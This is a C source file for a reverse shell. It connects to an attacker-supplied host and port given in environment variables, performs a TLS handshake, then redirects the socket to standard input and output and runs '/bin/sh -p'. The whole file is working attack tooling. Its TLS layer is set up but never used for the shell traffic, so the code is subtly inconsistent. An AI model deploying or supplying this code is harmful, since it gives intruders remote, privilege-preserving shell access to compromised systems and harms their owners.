#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define TIMEOUT 10  /* Connection timeout in seconds */

/* Function Prototypes */
int set_socket_timeout(int sockfd, int timeout);
void handle_signal(int sig);
SSL_CTX* init_ssl(void);
void cleanup_ssl(SSL_CTX *ctx);
int create_and_connect_socket(const char *RHOST, const char *RPORT, struct addrinfo *hints, struct addrinfo **remote_addr);
int establish_ssl_connection(SSL_CTX *ssl_ctx, SSL **ssl, int sockfd);
void spawn_shell(int sockfd);

int main(void) {
    const char *RHOST = getenv("RHOST");  /* remote IP/domain from environment variable */
    const char *RPORT = getenv("RPORT");  /* remote port from environment variable */

    if (RHOST == NULL || RPORT == NULL) {
        fprintf(stderr, "[!!] Environment variables RHOST and RPORT must be set\n");
        return EXIT_FAILURE;
    }

    /* Signal handling */
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;   /* Can be IPv4 or IPv6 */
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *remote_addr;
    int sockfd = create_and_connect_socket(RHOST, RPORT, &hints, &remote_addr);

    if (sockfd == -1) {
        return EXIT_FAILURE;
    }

    freeaddrinfo(remote_addr);

    /* Initialize SSL */
    SSL_CTX *ssl_ctx = init_ssl();
    SSL *ssl;
    if (establish_ssl_connection(ssl_ctx, &ssl, sockfd) == -1) {
        close(sockfd);
        cleanup_ssl(ssl_ctx);
        return EXIT_FAILURE;
    }

    puts("[*] Connection successful! Spawning shell...");

    spawn_shell(sockfd);

    /* Clean up */
    SSL_free(ssl);
    close(sockfd);
    cleanup_ssl(ssl_ctx);
    return EXIT_SUCCESS;
}

/* Function Definitions */

int set_socket_timeout(int sockfd, int timeout) {
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    return setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

void handle_signal(int sig) {
    fprintf(stderr, "\n[!] Received signal %d, exiting...\n", sig);
    exit(EXIT_FAILURE);
}

SSL_CTX* init_ssl(void) {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

void cleanup_ssl(SSL_CTX *ctx) {
    SSL_CTX_free(ctx);
    EVP_cleanup();
}

int create_and_connect_socket(const char *RHOST, const char *RPORT, struct addrinfo *hints, struct addrinfo **remote_addr) {
    int status;
    if ((status = getaddrinfo(RHOST, RPORT, hints, remote_addr)) != 0) {
        fprintf(stderr, "[!!] getaddrinfo: %s\n", gai_strerror(status));
        return -1;
    }

    struct addrinfo *p;
    int sockfd;
    for (p = *remote_addr; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("[!] socket");
            continue;
        }

        if (set_socket_timeout(sockfd, TIMEOUT) == -1) {
            perror("[!] setsockopt");
            close(sockfd);
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            perror("[!] connect");
            close(sockfd);
            continue;
        }

        return sockfd;
    }

    fprintf(stderr, "[!!] Failed to connect\n");
    return -1;
}

int establish_ssl_connection(SSL_CTX *ssl_ctx, SSL **ssl, int sockfd) {
    *ssl = SSL_new(ssl_ctx);
    if (!*ssl) {
        ERR_print_errors_fp(stderr);
        return -1;
    }

    SSL_set_fd(*ssl, sockfd);
    if (SSL_connect(*ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_free(*ssl);
        return -1;
    }

    return 0;
}

void spawn_shell(int sockfd) {
    if (dup2(sockfd, STDIN_FILENO) == -1 ||
        dup2(sockfd, STDOUT_FILENO) == -1 ||
        dup2(sockfd, STDERR_FILENO) == -1) {
        perror("[!!] dup2");
        exit(EXIT_FAILURE);
    }

    char *argv[] = {"/bin/sh", "-p", NULL};
    if (execve(argv[0], argv, NULL) == -1) {
        perror("[!!] execve");
        exit(EXIT_FAILURE);
    }
}
